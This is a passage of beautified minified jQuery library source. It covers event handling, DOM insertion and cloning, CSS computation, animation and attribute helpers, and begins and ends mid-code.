                        r.length && a.push({
                            elem: c,
                            handlers: r
                        })
                    } return c = this, l < t.length && a.push({
                elem: c,
                handlers: t.slice(l)
            }), a
        },
        addProp: function(e, t) {
            Object.defineProperty(x.Event.prototype, e, {
                enumerable: !0,
                configurable: !0,
                get: h(t) ? function() {
                    if (this.originalEvent) return t(this.originalEvent)
                } : function() {
                    if (this.originalEvent) return this.originalEvent[e]
                },
                set: function(t) {
                    Object.defineProperty(this, e, {
                        enumerable: !0,
                        configurable: !0,
                        writable: !0,
                        value: t
                    })
                }
            })
        },
        fix: function(e) {
            return e[x.expando] ? e : new x.Event(e)
        },
        special: {
            load: {
                noBubble: !0
            },
            click: {
                setup: function(e) {
                    var t = this || e;
                    return fe.test(t.type) && t.click && $(t, "input") && Ae(t, "click", ke), !1
                },
                trigger: function(e) {
                    var t = this || e;
                    return fe.test(t.type) && t.click && $(t, "input") && Ae(t, "click"), !0
                },
                _default: function(e) {
                    var t = e.target;
                    return fe.test(t.type) && t.click && $(t, "input") && U.get(t, "click") || $(t, "a")
                }
            },
            beforeunload: {
                postDispatch: function(e) {
                    void 0 !== e.result && e.originalEvent && (e.originalEvent.returnValue = e.result)
                }
            }
        }
    }, x.removeEvent = function(e, t, i) {
        e.removeEventListener && e.removeEventListener(t, i)
    }, x.Event = function(e, t) {
        if (!(this instanceof x.Event)) return new x.Event(e, t);
        e && e.type ? (this.originalEvent = e, this.type = e.type, this.isDefaultPrevented = e.defaultPrevented || void 0 === e.defaultPrevented && !1 === e.returnValue ? ke : Ce, this.target = e.target && 3 === e.target.nodeType ? e.target.parentNode : e.target, this.currentTarget = e.currentTarget, this.relatedTarget = e.relatedTarget) : this.type = e, t && x.extend(this, t), this.timeStamp = e && e.timeStamp || Date.now(), this[x.expando] = !0
    }, x.Event.prototype = {
        constructor: x.Event,
        isDefaultPrevented: Ce,
        isPropagationStopped: Ce,
        isImmediatePropagationStopped: Ce,
        isSimulated: !1,
        preventDefault: function() {
            var e = this.originalEvent;
            this.isDefaultPrevented = ke, e && !this.isSimulated && e.preventDefault()
        },
        stopPropagation: function() {
            var e = this.originalEvent;
            this.isPropagationStopped = ke, e && !this.isSimulated && e.stopPropagation()
        },
        stopImmediatePropagation: function() {
            var e = this.originalEvent;
            this.isImmediatePropagationStopped = ke, e && !this.isSimulated && e.stopImmediatePropagation(), this.stopPropagation()
        }
    }, x.each({
        altKey: !0,
        bubbles: !0,
        cancelable: !0,
        changedTouches: !0,
        ctrlKey: !0,
        detail: !0,
        eventPhase: !0,
        metaKey: !0,
        pageX: !0,
        pageY: !0,
        shiftKey: !0,
        view: !0,
        char: !0,
        code: !0,
        charCode: !0,
        key: !0,
        keyCode: !0,
        button: !0,
        buttons: !0,
        clientX: !0,
        clientY: !0,
        offsetX: !0,
        offsetY: !0,
        pointerId: !0,
        pointerType: !0,
        screenX: !0,
        screenY: !0,
        targetTouches: !0,
        toElement: !0,
        touches: !0,
        which: !0
    }, x.event.addProp), x.each({
        focus: "focusin",
        blur: "focusout"
    }, (function(e, t) {
        x.event.special[e] = {
            setup: function() {
                return Ae(this, e, Te), !1
            },
            trigger: function() {
                return Ae(this, e), !0
            },
            _default: function() {
                return !0
            },
            delegateType: t
        }
    })), x.each({
        mouseenter: "mouseover",
        mouseleave: "mouseout",
        pointerenter: "pointerover",
        pointerleave: "pointerout"
    }, (function(e, t) {
        x.event.special[e] = {
            delegateType: t,
            bindType: t,
            handle: function(e) {
                var i, o = e.relatedTarget,
                    r = e.handleObj;
                return o && (o === this || x.contains(this, o)) || (e.type = r.origType, i = r.handler.apply(this, arguments), e.type = t), i
            }
        }
    })), x.fn.extend({
        on: function(e, t, i, n) {
            return Se(this, e, t, i, n)
        },
        one: function(e, t, i, n) {
            return Se(this, e, t, i, n, 1)
        },
        off: function(e, t, i) {
            var n, o;
            if (e && e.preventDefault && e.handleObj) return n = e.handleObj, x(e.delegateTarget).off(n.namespace ? n.origType + "." + n.namespace : n.origType, n.selector, n.handler), this;
            if ("object" == typeof e) {
                for (o in e) this.off(o, t, e[o]);
                return this
            }
            return !1 !== t && "function" != typeof t || (i = t, t = void 0), !1 === i && (i = Ce), this.each((function() {
                x.event.remove(this, e, i, t)
            }))
        }
    });
    var $e = /<script|<style|<link/i,
        Ee = /checked\s*(?:[^=]|=\s*.checked.)/i,
        Pe = /^\s*<!(?:\[CDATA\[|--)|(?:\]\]|--)>\s*$/g;

    function Oe(e, t) {
        return $(e, "table") && $(11 !== t.nodeType ? t : t.firstChild, "tr") && x(e).children("tbody")[0] || e
    }

    function De(e) {
        return e.type = (null !== e.getAttribute("type")) + "/" + e.type, e
    }

    function Me(e) {
        return "true/" === (e.type || "").slice(0, 5) ? e.type = e.type.slice(5) : e.removeAttribute("type"), e
    }

    function je(e, t) {
        var i, n, o, r, s, a;
        if (1 === t.nodeType) {
            if (U.hasData(e) && (a = U.get(e).events))
                for (o in U.remove(t, "handle events"), a)
                    for (i = 0, n = a[o].length; i < n; i++) x.event.add(t, o, a[o][i]);
            G.hasData(e) && (r = G.access(e), s = x.extend({}, r), G.set(t, s))
        }
    }

    function qe(e, t) {
        var i = t.nodeName.toLowerCase();
        "input" === i && fe.test(e.type) ? t.checked = e.checked : "input" !== i && "textarea" !== i || (t.defaultValue = e.defaultValue)
    }

    function Le(e, t, i, n) {
        t = r(t);
        var o, s, a, l, c, u, d = 0,
            p = e.length,
            v = p - 1,
            g = t[0],
            m = h(g);
        if (m || p > 1 && "string" == typeof g && !f.checkClone && Ee.test(g)) return e.each((function(o) {
            var r = e.eq(o);
            m && (t[0] = g.call(this, o, r.html())), Le(r, t, i, n)
        }));
        if (p && (s = (o = we(t, e[0].ownerDocument, !1, e, n)).firstChild, 1 === o.childNodes.length && (o = s), s || n)) {
            for (l = (a = x.map(me(o, "script"), De)).length; d < p; d++) c = o, d !== v && (c = x.clone(c, !0, !0), l && x.merge(a, me(c, "script"))), i.call(e[d], c, d);
            if (l)
                for (u = a[a.length - 1].ownerDocument, x.map(a, Me), d = 0; d < l; d++) c = a[d], ve.test(c.type || "") && !U.access(c, "globalEval") && x.contains(u, c) && (c.src && "module" !== (c.type || "").toLowerCase() ? x._evalUrl && !c.noModule && x._evalUrl(c.src, {
                    nonce: c.nonce || c.getAttribute("nonce")
                }, u) : y(c.textContent.replace(Pe, ""), c, u))
        }
        return e
    }

    function He(e, t, i) {
        for (var n, o = t ? x.filter(t, e) : e, r = 0; null != (n = o[r]); r++) i || 1 !== n.nodeType || x.cleanData(me(n)), n.parentNode && (i && oe(n) && ye(me(n, "script")), n.parentNode.removeChild(n));
        return e
    }
    x.extend({
        htmlPrefilter: function(e) {
            return e
        },
        clone: function(e, t, i) {
            var n, o, r, s, a = e.cloneNode(!0),
                l = oe(e);
            if (!(f.noCloneChecked || 1 !== e.nodeType && 11 !== e.nodeType || x.isXMLDoc(e)))
                for (s = me(a), n = 0, o = (r = me(e)).length; n < o; n++) qe(r[n], s[n]);
            if (t)
                if (i)
                    for (r = r || me(e), s = s || me(a), n = 0, o = r.length; n < o; n++) je(r[n], s[n]);
                else je(e, a);
            return (s = me(a, "script")).length > 0 && ye(s, !l && me(e, "script")), a
        },
        cleanData: function(e) {
            for (var t, i, n, o = x.event.special, r = 0; void 0 !== (i = e[r]); r++)
                if (Q(i)) {
                    if (t = i[U.expando]) {
                        if (t.events)
                            for (n in t.events) o[n] ? x.event.remove(i, n) : x.removeEvent(i, n, t.handle);
                        i[U.expando] = void 0
                    }
                    i[G.expando] && (i[G.expando] = void 0)
                }
        }
    }), x.fn.extend({
        detach: function(e) {
            return He(this, e, !0)
        },
        remove: function(e) {
            return He(this, e)
        },
        text: function(e) {
            return R(this, (function(e) {
                return void 0 === e ? x.text(this) : this.empty().each((function() {
                    1 !== this.nodeType && 11 !== this.nodeType && 9 !== this.nodeType || (this.textContent = e)
                }))
            }), null, e, arguments.length)
        },
        append: function() {
            return Le(this, arguments, (function(e) {
                1 !== this.nodeType && 11 !== this.nodeType && 9 !== this.nodeType || Oe(this, e).appendChild(e)
            }))
        },
        prepend: function() {
            return Le(this, arguments, (function(e) {
                if (1 === this.nodeType || 11 === this.nodeType || 9 === this.nodeType) {
                    var t = Oe(this, e);
                    t.insertBefore(e, t.firstChild)
                }
            }))
        },
        before: function() {
            return Le(this, arguments, (function(e) {
                this.parentNode && this.parentNode.insertBefore(e, this)
            }))
        },
        after: function() {
            return Le(this, arguments, (function(e) {
                this.parentNode && this.parentNode.insertBefore(e, this.nextSibling)
            }))
        },
        empty: function() {
            for (var e, t = 0; null != (e = this[t]); t++) 1 === e.nodeType && (x.cleanData(me(e, !1)), e.textContent = "");
            return this
        },
        clone: function(e, t) {
            return e = null != e && e, t = null == t ? e : t, this.map((function() {
                return x.clone(this, e, t)
            }))
        },
        html: function(e) {
            return R(this, (function(e) {
                var t = this[0] || {},
                    i = 0,
                    n = this.length;
                if (void 0 === e && 1 === t.nodeType) return t.innerHTML;
                if ("string" == typeof e && !$e.test(e) && !ge[(he.exec(e) || ["", ""])[1].toLowerCase()]) {
                    e = x.htmlPrefilter(e);
                    try {
                        for (; i < n; i++) 1 === (t = this[i] || {}).nodeType && (x.cleanData(me(t, !1)), t.innerHTML = e);
                        t = 0
                    } catch (e) {}
                }
                t && this.empty().append(e)
            }), null, e, arguments.length)
        },
        replaceWith: function() {
            var e = [];
            return Le(this, arguments, (function(t) {
                var i = this.parentNode;
                x.inArray(this, e) < 0 && (x.cleanData(me(this)), i && i.replaceChild(t, this))
            }), e)
        }
    }), x.each({
        appendTo: "append",
        prependTo: "prepend",
        insertBefore: "before",
        insertAfter: "after",
        replaceAll: "replaceWith"
    }, (function(e, t) {
        x.fn[e] = function(e) {
            for (var i, n = [], o = x(e), r = o.length - 1, a = 0; a <= r; a++) i = a === r ? this : this.clone(!0), x(o[a])[t](i), s.apply(n, i.get());
            return this.pushStack(n)
        }
    }));
    var Ne = new RegExp("^(" + ee + ")(?!px)[a-z%]+$", "i"),
        Ie = function(t) {
            var i = t.ownerDocument.defaultView;
            return i && i.opener || (i = e), i.getComputedStyle(t)
        },
        ze = function(e, t, i) {
            var n, o, r = {};
            for (o in t) r[o] = e.style[o], e.style[o] = t[o];
            for (o in n = i.call(e), t) e.style[o] = r[o];
            return n
        },
        _e = new RegExp(ie.join("|"), "i");

    function We(e, t, i) {
        var n, o, r, s, a = e.style;
        return (i = i || Ie(e)) && ("" !== (s = i.getPropertyValue(t) || i[t]) || oe(e) || (s = x.style(e, t)), !f.pixelBoxStyles() && Ne.test(s) && _e.test(t) && (n = a.width, o = a.minWidth, r = a.maxWidth, a.minWidth = a.maxWidth = a.width = s, s = i.width, a.width = n, a.minWidth = o, a.maxWidth = r)), void 0 !== s ? s + "" : s
    }

    function Re(e, t) {
        return {
            get: function() {
                if (!e()) return (this.get = t).apply(this, arguments);
                delete this.get
            }
        }
    }! function() {
        function t() {
            if (u) {
                c.style.cssText = "position:absolute;left:-11111px;width:60px;margin-top:1px;padding:0;border:0", u.style.cssText = "position:relative;display:block;box-sizing:border-box;overflow:scroll;margin:auto;border:1px;padding:1px;width:60%;top:1%", ne.appendChild(c).appendChild(u);
                var t = e.getComputedStyle(u);
                n = "1%" !== t.top, l = 12 === i(t.marginLeft), u.style.right = "60%", s = 36 === i(t.right), o = 36 === i(t.width), u.style.position = "absolute", r = 12 === i(u.offsetWidth / 3), ne.removeChild(c), u = null
            }
        }

        function i(e) {
            return Math.round(parseFloat(e))
        }
        var n, o, r, s, a, l, c = g.createElement("div"),
            u = g.createElement("div");
        u.style && (u.style.backgroundClip = "content-box", u.cloneNode(!0).style.backgroundClip = "", f.clearCloneStyle = "content-box" === u.style.backgroundClip, x.extend(f, {
            boxSizingReliable: function() {
                return t(), o
            },
            pixelBoxStyles: function() {
                return t(), s
            },
            pixelPosition: function() {
                return t(), n
            },
            reliableMarginLeft: function() {
                return t(), l
            },
            scrollboxSize: function() {
                return t(), r
            },
            reliableTrDimensions: function() {
                var t, i, n, o;
                return null == a && (t = g.createElement("table"), i = g.createElement("tr"), n = g.createElement("div"), t.style.cssText = "position:absolute;left:-11111px;border-collapse:separate", i.style.cssText = "border:1px solid", i.style.height = "1px", n.style.height = "9px", n.style.display = "block", ne.appendChild(t).appendChild(i).appendChild(n), o = e.getComputedStyle(i), a = parseInt(o.height, 10) + parseInt(o.borderTopWidth, 10) + parseInt(o.borderBottomWidth, 10) === i.offsetHeight, ne.removeChild(t)), a
            }
        }))
    }();
    var Fe = ["Webkit", "Moz", "ms"],
        Ve = g.createElement("div").style,
        Xe = {};

    function Be(e) {
        return x.cssProps[e] || Xe[e] || (e in Ve ? e : Xe[e] = function(e) {
            for (var t = e[0].toUpperCase() + e.slice(1), i = Fe.length; i--;)
                if ((e = Fe[i] + t) in Ve) return e
        }(e) || e)
    }
    var Qe = /^(none|table(?!-c[ea]).+)/,
        Ye = /^--/,
        Ue = {
            position: "absolute",
            visibility: "hidden",
            display: "block"
        },
        Ge = {
            letterSpacing: "0",
            fontWeight: "400"
        };

    function Ze(e, t, i) {
        var n = te.exec(t);
        return n ? Math.max(0, n[2] - (i || 0)) + (n[3] || "px") : t
    }

    function Je(e, t, i, n, o, r) {
        var s = "width" === t ? 1 : 0,
            a = 0,
            l = 0;
        if (i === (n ? "border" : "content")) return 0;
        for (; s < 4; s += 2) "margin" === i && (l += x.css(e, i + ie[s], !0, o)), n ? ("content" === i && (l -= x.css(e, "padding" + ie[s], !0, o)), "margin" !== i && (l -= x.css(e, "border" + ie[s] + "Width", !0, o))) : (l += x.css(e, "padding" + ie[s], !0, o), "padding" !== i ? l += x.css(e, "border" + ie[s] + "Width", !0, o) : a += x.css(e, "border" + ie[s] + "Width", !0, o));
        return !n && r >= 0 && (l += Math.max(0, Math.ceil(e["offset" + t[0].toUpperCase() + t.slice(1)] - r - l - a - .5)) || 0), l
    }

    function Ke(e, t, i) {
        var n = Ie(e),
            o = (!f.boxSizingReliable() || i) && "border-box" === x.css(e, "boxSizing", !1, n),
            r = o,
            s = We(e, t, n),
            a = "offset" + t[0].toUpperCase() + t.slice(1);
        if (Ne.test(s)) {
            if (!i) return s;
            s = "auto"
        }
        return (!f.boxSizingReliable() && o || !f.reliableTrDimensions() && $(e, "tr") || "auto" === s || !parseFloat(s) && "inline" === x.css(e, "display", !1, n)) && e.getClientRects().length && (o = "border-box" === x.css(e, "boxSizing", !1, n), (r = a in e) && (s = e[a])), (s = parseFloat(s) || 0) + Je(e, t, i || (o ? "border" : "content"), r, n, s) + "px"
    }

    function et(e, t, i, n, o) {
        return new et.prototype.init(e, t, i, n, o)
    }
    x.extend({
        cssHooks: {
            opacity: {
                get: function(e, t) {
                    if (t) {
                        var i = We(e, "opacity");
                        return "" === i ? "1" : i
                    }
                }
            }
        },
        cssNumber: {
            animationIterationCount: !0,
            columnCount: !0,
            fillOpacity: !0,
            flexGrow: !0,
            flexShrink: !0,
            fontWeight: !0,
            gridArea: !0,
            gridColumn: !0,
            gridColumnEnd: !0,
            gridColumnStart: !0,
            gridRow: !0,
            gridRowEnd: !0,
            gridRowStart: !0,
            lineHeight: !0,
            opacity: !0,
            order: !0,
            orphans: !0,
            widows: !0,
            zIndex: !0,
            zoom: !0
        },
        cssProps: {},
        style: function(e, t, i, n) {
            if (e && 3 !== e.nodeType && 8 !== e.nodeType && e.style) {
                var o, r, s, a = B(t),
                    l = Ye.test(t),
                    c = e.style;
                if (l || (t = Be(a)), s = x.cssHooks[t] || x.cssHooks[a], void 0 === i) return s && "get" in s && void 0 !== (o = s.get(e, !1, n)) ? o : c[t];
                "string" == (r = typeof i) && (o = te.exec(i)) && o[1] && (i = ae(e, t, o), r = "number"), null != i && i == i && ("number" !== r || l || (i += o && o[3] || (x.cssNumber[a] ? "" : "px")), f.clearCloneStyle || "" !== i || 0 !== t.indexOf("background") || (c[t] = "inherit"), s && "set" in s && void 0 === (i = s.set(e, i, n)) || (l ? c.setProperty(t, i) : c[t] = i))
            }
        },
        css: function(e, t, i, n) {
            var o, r, s, a = B(t);
            return Ye.test(t) || (t = Be(a)), (s = x.cssHooks[t] || x.cssHooks[a]) && "get" in s && (o = s.get(e, !0, i)), void 0 === o && (o = We(e, t, n)), "normal" === o && t in Ge && (o = Ge[t]), "" === i || i ? (r = parseFloat(o), !0 === i || isFinite(r) ? r || 0 : o) : o
        }
    }), x.each(["height", "width"], (function(e, t) {
        x.cssHooks[t] = {
            get: function(e, i, n) {
                if (i) return !Qe.test(x.css(e, "display")) || e.getClientRects().length && e.getBoundingClientRect().width ? Ke(e, t, n) : ze(e, Ue, (function() {
                    return Ke(e, t, n)
                }))
            },
            set: function(e, i, n) {
                var o, r = Ie(e),
                    s = !f.scrollboxSize() && "absolute" === r.position,
                    a = (s || n) && "border-box" === x.css(e, "boxSizing", !1, r),
                    l = n ? Je(e, t, n, a, r) : 0;
                return a && s && (l -= Math.ceil(e["offset" + t[0].toUpperCase() + t.slice(1)] - parseFloat(r[t]) - Je(e, t, "border", !1, r) - .5)), l && (o = te.exec(i)) && "px" !== (o[3] || "px") && (e.style[t] = i, i = x.css(e, t)), Ze(0, i, l)
            }
        }
    })), x.cssHooks.marginLeft = Re(f.reliableMarginLeft, (function(e, t) {
        if (t) return (parseFloat(We(e, "marginLeft")) || e.getBoundingClientRect().left - ze(e, {
            marginLeft: 0
        }, (function() {
            return e.getBoundingClientRect().left
        }))) + "px"
    })), x.each({
        margin: "",
        padding: "",
        border: "Width"
    }, (function(e, t) {
        x.cssHooks[e + t] = {
            expand: function(i) {
                for (var n = 0, o = {}, r = "string" == typeof i ? i.split(" ") : [i]; n < 4; n++) o[e + ie[n] + t] = r[n] || r[n - 2] || r[0];
                return o
            }
        }, "margin" !== e && (x.cssHooks[e + t].set = Ze)
    })), x.fn.extend({
        css: function(e, t) {
            return R(this, (function(e, t, i) {
                var n, o, r = {},
                    s = 0;
                if (Array.isArray(t)) {
                    for (n = Ie(e), o = t.length; s < o; s++) r[t[s]] = x.css(e, t[s], !1, n);
                    return r
                }
                return void 0 !== i ? x.style(e, t, i) : x.css(e, t)
            }), e, t, arguments.length > 1)
        }
    }), x.Tween = et, et.prototype = {
        constructor: et,
        init: function(e, t, i, n, o, r) {
            this.elem = e, this.prop = i, this.easing = o || x.easing._default, this.options = t, this.start = this.now = this.cur(), this.end = n, this.unit = r || (x.cssNumber[i] ? "" : "px")
        },
        cur: function() {
            var e = et.propHooks[this.prop];
            return e && e.get ? e.get(this) : et.propHooks._default.get(this)
        },
        run: function(e) {
            var t, i = et.propHooks[this.prop];
            return this.options.duration ? this.pos = t = x.easing[this.easing](e, this.options.duration * e, 0, 1, this.options.duration) : this.pos = t = e, this.now = (this.end - this.start) * t + this.start, this.options.step && this.options.step.call(this.elem, this.now, this), i && i.set ? i.set(this) : et.propHooks._default.set(this), this
        }
    }, et.prototype.init.prototype = et.prototype, et.propHooks = {
        _default: {
            get: function(e) {
                var t;
                return 1 !== e.elem.nodeType || null != e.elem[e.prop] && null == e.elem.style[e.prop] ? e.elem[e.prop] : (t = x.css(e.elem, e.prop, "")) && "auto" !== t ? t : 0
            },
            set: function(e) {
                x.fx.step[e.prop] ? x.fx.step[e.prop](e) : 1 !== e.elem.nodeType || !x.cssHooks[e.prop] && null == e.elem.style[Be(e.prop)] ? e.elem[e.prop] = e.now : x.style(e.elem, e.prop, e.now + e.unit)
            }
        }
    }, et.propHooks.scrollTop = et.propHooks.scrollLeft = {
        set: function(e) {
            e.elem.nodeType && e.elem.parentNode && (e.elem[e.prop] = e.now)
        }
    }, x.easing = {
        linear: function(e) {
            return e
        },
        swing: function(e) {
            return .5 - Math.cos(e * Math.PI) / 2
        },
        _default: "swing"
    }, x.fx = et.prototype.init, x.fx.step = {};
    var tt, it, nt = /^(?:toggle|show|hide)$/,
        ot = /queueHooks$/;

    function rt() {
        it && (!1 === g.hidden && e.requestAnimationFrame ? e.requestAnimationFrame(rt) : e.setTimeout(rt, x.fx.interval), x.fx.tick())
    }

    function st() {
        return e.setTimeout((function() {
            tt = void 0
        })), tt = Date.now()
    }

    function at(e, t) {
        var i, n = 0,
            o = {
                height: e
            };
        for (t = t ? 1 : 0; n < 4; n += 2 - t) o["margin" + (i = ie[n])] = o["padding" + i] = e;
        return t && (o.opacity = o.width = e), o
    }

    function lt(e, t, i) {
        for (var n, o = (ct.tweeners[t] || []).concat(ct.tweeners["*"]), r = 0, s = o.length; r < s; r++)
            if (n = o[r].call(i, t, e)) return n
    }

    function ct(e, t, i) {
        var n, o, r = 0,
            s = ct.prefilters.length,
            a = x.Deferred().always((function() {
                delete l.elem
            })),
            l = function() {
                if (o) return !1;
                for (var t = tt || st(), i = Math.max(0, c.startTime + c.duration - t), n = 1 - (i / c.duration || 0), r = 0, s = c.tweens.length; r < s; r++) c.tweens[r].run(n);
                return a.notifyWith(e, [c, n, i]), n < 1 && s ? i : (s || a.notifyWith(e, [c, 1, 0]), a.resolveWith(e, [c]), !1)
            },
            c = a.promise({
                elem: e,
                props: x.extend({}, t),
                opts: x.extend(!0, {
                    specialEasing: {},
                    easing: x.easing._default
                }, i),
                originalProperties: t,
                originalOptions: i,
                startTime: tt || st(),
                duration: i.duration,
                tweens: [],
                createTween: function(t, i) {
                    var n = x.Tween(e, c.opts, t, i, c.opts.specialEasing[t] || c.opts.easing);
                    return c.tweens.push(n), n
                },
                stop: function(t) {
                    var i = 0,
                        n = t ? c.tweens.length : 0;
                    if (o) return this;
                    for (o = !0; i < n; i++) c.tweens[i].run(1);
                    return t ? (a.notifyWith(e, [c, 1, 0]), a.resolveWith(e, [c, t])) : a.rejectWith(e, [c, t]), this
                }
            }),
            u = c.props;
        for (function(e, t) {
                var i, n, o, r, s;
                for (i in e)
                    if (o = t[n = B(i)], r = e[i], Array.isArray(r) && (o = r[1], r = e[i] = r[0]), i !== n && (e[n] = r, delete e[i]), (s = x.cssHooks[n]) && "expand" in s)
                        for (i in r = s.expand(r), delete e[n], r) i in e || (e[i] = r[i], t[i] = o);
                    else t[n] = o
            }(u, c.opts.specialEasing); r < s; r++)
            if (n = ct.prefilters[r].call(c, e, u, c.opts)) return h(n.stop) && (x._queueHooks(c.elem, c.opts.queue).stop = n.stop.bind(n)), n;
        return x.map(u, lt, c), h(c.opts.start) && c.opts.start.call(e, c), c.progress(c.opts.progress).done(c.opts.done, c.opts.complete).fail(c.opts.fail).always(c.opts.always), x.fx.timer(x.extend(l, {
            elem: e,
            anim: c,
            queue: c.opts.queue
        })), c
    }
    x.Animation = x.extend(ct, {
            tweeners: {
                "*": [function(e, t) {
                    var i = this.createTween(e, t);
                    return ae(i.elem, e, te.exec(t), i), i
                }]
            },
            tweener: function(e, t) {
                h(e) ? (t = e, e = ["*"]) : e = e.match(L);
                for (var i, n = 0, o = e.length; n < o; n++) i = e[n], ct.tweeners[i] = ct.tweeners[i] || [], ct.tweeners[i].unshift(t)
            },
            prefilters: [function(e, t, i) {
                var n, o, r, s, a, l, c, u, d = "width" in t || "height" in t,
                    p = this,
                    f = {},
                    h = e.style,
                    v = e.nodeType && se(e),
                    g = U.get(e, "fxshow");
                for (n in i.queue || (null == (s = x._queueHooks(e, "fx")).unqueued && (s.unqueued = 0, a = s.empty.fire, s.empty.fire = function() {
                        s.unqueued || a()
                    }), s.unqueued++, p.always((function() {
                        p.always((function() {
                            s.unqueued--, x.queue(e, "fx").length || s.empty.fire()
                        }))
                    }))), t)
                    if (o = t[n], nt.test(o)) {
                        if (delete t[n], r = r || "toggle" === o, o === (v ? "hide" : "show")) {
                            if ("show" !== o || !g || void 0 === g[n]) continue;
                            v = !0
                        }
                        f[n] = g && g[n] || x.style(e, n)
                    } if ((l = !x.isEmptyObject(t)) || !x.isEmptyObject(f))
                    for (n in d && 1 === e.nodeType && (i.overflow = [h.overflow, h.overflowX, h.overflowY], null == (c = g && g.display) && (c = U.get(e, "display")), "none" === (u = x.css(e, "display")) && (c ? u = c : (ue([e], !0), c = e.style.display || c, u = x.css(e, "display"), ue([e]))), ("inline" === u || "inline-block" === u && null != c) && "none" === x.css(e, "float") && (l || (p.done((function() {
                            h.display = c
                        })), null == c && (u = h.display, c = "none" === u ? "" : u)), h.display = "inline-block")), i.overflow && (h.overflow = "hidden", p.always((function() {
                            h.overflow = i.overflow[0], h.overflowX = i.overflow[1], h.overflowY = i.overflow[2]
                        }))), l = !1, f) l || (g ? "hidden" in g && (v = g.hidden) : g = U.access(e, "fxshow", {
                        display: c
                    }), r && (g.hidden = !v), v && ue([e], !0), p.done((function() {
                        for (n in v || ue([e]), U.remove(e, "fxshow"), f) x.style(e, n, f[n])
                    }))), l = lt(v ? g[n] : 0, n, p), n in g || (g[n] = l.start, v && (l.end = l.start, l.start = 0))
            }],
            prefilter: function(e, t) {
                t ? ct.prefilters.unshift(e) : ct.prefilters.push(e)
            }
        }), x.speed = function(e, t, i) {
            var n = e && "object" == typeof e ? x.extend({}, e) : {
                complete: i || !i && t || h(e) && e,
                duration: e,
                easing: i && t || t && !h(t) && t
            };
            return x.fx.off ? n.duration = 0 : "number" != typeof n.duration && (n.duration in x.fx.speeds ? n.duration = x.fx.speeds[n.duration] : n.duration = x.fx.speeds._default), null != n.queue && !0 !== n.queue || (n.queue = "fx"), n.old = n.complete, n.complete = function() {
                h(n.old) && n.old.call(this), n.queue && x.dequeue(this, n.queue)
            }, n
        }, x.fn.extend({
            fadeTo: function(e, t, i, n) {
                return this.filter(se).css("opacity", 0).show().end().animate({
                    opacity: t
                }, e, i, n)
            },
            animate: function(e, t, i, n) {
                var o = x.isEmptyObject(e),
                    r = x.speed(t, i, n),
                    s = function() {
                        var t = ct(this, x.extend({}, e), r);
                        (o || U.get(this, "finish")) && t.stop(!0)
                    };
                return s.finish = s, o || !1 === r.queue ? this.each(s) : this.queue(r.queue, s)
            },
            stop: function(e, t, i) {
                var n = function(e) {
                    var t = e.stop;
                    delete e.stop, t(i)
                };
                return "string" != typeof e && (i = t, t = e, e = void 0), t && this.queue(e || "fx", []), this.each((function() {
                    var t = !0,
                        o = null != e && e + "queueHooks",
                        r = x.timers,
                        s = U.get(this);
                    if (o) s[o] && s[o].stop && n(s[o]);
                    else
                        for (o in s) s[o] && s[o].stop && ot.test(o) && n(s[o]);
                    for (o = r.length; o--;) r[o].elem !== this || null != e && r[o].queue !== e || (r[o].anim.stop(i), t = !1, r.splice(o, 1));
                    !t && i || x.dequeue(this, e)
                }))
            },
            finish: function(e) {
                return !1 !== e && (e = e || "fx"), this.each((function() {
                    var t, i = U.get(this),
                        n = i[e + "queue"],
                        o = i[e + "queueHooks"],
                        r = x.timers,
                        s = n ? n.length : 0;
                    for (i.finish = !0, x.queue(this, e, []), o && o.stop && o.stop.call(this, !0), t = r.length; t--;) r[t].elem === this && r[t].queue === e && (r[t].anim.stop(!0), r.splice(t, 1));
                    for (t = 0; t < s; t++) n[t] && n[t].finish && n[t].finish.call(this);
                    delete i.finish
                }))
            }
        }), x.each(["toggle", "show", "hide"], (function(e, t) {
            var i = x.fn[t];
            x.fn[t] = function(e, n, o) {
                return null == e || "boolean" == typeof e ? i.apply(this, arguments) : this.animate(at(t, !0), e, n, o)
            }
        })), x.each({
            slideDown: at("show"),
            slideUp: at("hide"),
            slideToggle: at("toggle"),
            fadeIn: {
                opacity: "show"
            },
            fadeOut: {
                opacity: "hide"
            },
            fadeToggle: {
                opacity: "toggle"
            }
        }, (function(e, t) {
            x.fn[e] = function(e, i, n) {
                return this.animate(t, e, i, n)
            }
        })), x.timers = [], x.fx.tick = function() {
            var e, t = 0,
                i = x.timers;
            for (tt = Date.now(); t < i.length; t++)(e = i[t])() || i[t] !== e || i.splice(t--, 1);
            i.length || x.fx.stop(), tt = void 0
        }, x.fx.timer = function(e) {
            x.timers.push(e), x.fx.start()
        }, x.fx.interval = 13, x.fx.start = function() {
            it || (it = !0, rt())
        }, x.fx.stop = function() {
            it = null
        }, x.fx.speeds = {
            slow: 600,
            fast: 200,
            _default: 400
        }, x.fn.delay = function(t, i) {
            return t = x.fx && x.fx.speeds[t] || t, i = i || "fx", this.queue(i, (function(i, n) {
                var o = e.setTimeout(i, t);
                n.stop = function() {
                    e.clearTimeout(o)
                }
            }))
        },
        function() {
            var e = g.createElement("input"),
                t = g.createElement("select").appendChild(g.createElement("option"));
            e.type = "checkbox", f.checkOn = "" !== e.value, f.optSelected = t.selected, (e = g.createElement("input")).value = "t", e.type = "radio", f.radioValue = "t" === e.value
        }();
    var ut, dt = x.expr.attrHandle;
    x.fn.extend({
        attr: function(e, t) {
            return R(this, x.attr, e, t, arguments.length > 1)
        },
        removeAttr: function(e) {
            return this.each((function() {
                x.removeAttr(this, e)
            }))
        }
    }), x.extend({
        attr: function(e, t, i) {
            var n, o, r = e.nodeType;
            if (3 !== r && 8 !== r && 2 !== r) return void 0 === e.getAttribute ? x.prop(e, t, i) : (1 === r && x.isXMLDoc(e) || (o = x.attrHooks[t.toLowerCase()] || (x.expr.match.bool.test(t) ? ut : void 0)), void 0 !== i ? null === i ? void x.removeAttr(e, t) : o && "set" in o && void 0 !== (n = o.set(e, i, t)) ? n : (e.setAttribute(t, i + ""), i) : o && "get" in o && null !== (n = o.get(e, t)) ? n : null == (n = x.find.attr(e, t)) ? void 0 : n)
        },
        attrHooks: {
            type: {
                set: function(e, t) {
                    if (!f.radioValue && "radio" === t && $(e, "input")) {
                        var i = e.value;
                        return e.setAttribute("type", t), i && (e.value = i), t
                    }
                }
            }
        },
        removeAttr: function(e, t) {
            var i, n = 0,
                o = t && t.match(L);
            if (o && 1 === e.nodeType)
                for (; i = o[n++];) e.removeAttribute(i)
        }
    }), ut = {
        set: function(e, t, i) {
            return !1 === t ? x.removeAttr(e, i) : e.setAttribute(i, i), i
        }
